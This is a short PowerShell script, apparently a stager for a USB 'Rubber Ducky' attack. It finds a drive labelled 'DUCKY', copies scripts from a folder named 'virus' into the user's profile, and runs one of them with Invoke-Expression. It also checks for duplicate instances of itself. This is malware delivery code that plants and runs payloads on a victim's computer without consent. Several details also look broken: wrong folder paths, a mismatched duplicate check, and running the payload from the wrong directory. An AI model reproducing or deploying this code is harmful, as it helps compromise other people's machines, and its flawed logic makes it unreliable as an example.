$currentPID = $PID
$duplicateProcess = Get-Process -Name "powershell" | Where-Object { $_.Id -ne $currentPID -and $_.CommandLine -match $MyInvocation.MyCommand.Path }

if ($duplicateProcess.Count -gt 1) {
    Write-Output "Triplicate found. Terminating new process..."
    exit 1
}


$localUsername = $env:USERNAME

$driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter

$callPathBeforeCopy = Get-ChildItem -Path $driveLetter\* -Recurse -Filter "virus\call.ps1"
$callPathBeforeDelayCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\virus

$callMoveDir = "C:\Users\$localUsername\Document\virus\call.ps1"

$eventPathBeforeCopy = Get-ChildItem -Path $driveletter\virus -Recurse -Filter "event.ps1"
$eventPathBeforeDelayCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\virus -Recurse -Filter "event.ps1"
$eventMoveDir = "C:\Users\$localUsername\Document\virus\event.ps1"


If ($driveLetter){
    Copy-Item -Path $callPathBeforeCopy -Destination $callMoveDir
    Copy-Item -Path $eventPathBeforeCopy -Destination $eventMoveDir
} else {
    Copy-Item -Path $callPathBeforeDelayCopy -Destination $callMoveDir
    Copy-Item -Path $eventPathBeforeDelayCopy -Destination $eventMoveDir
}
Invoke-Expression -Command .\event.ps1
exit
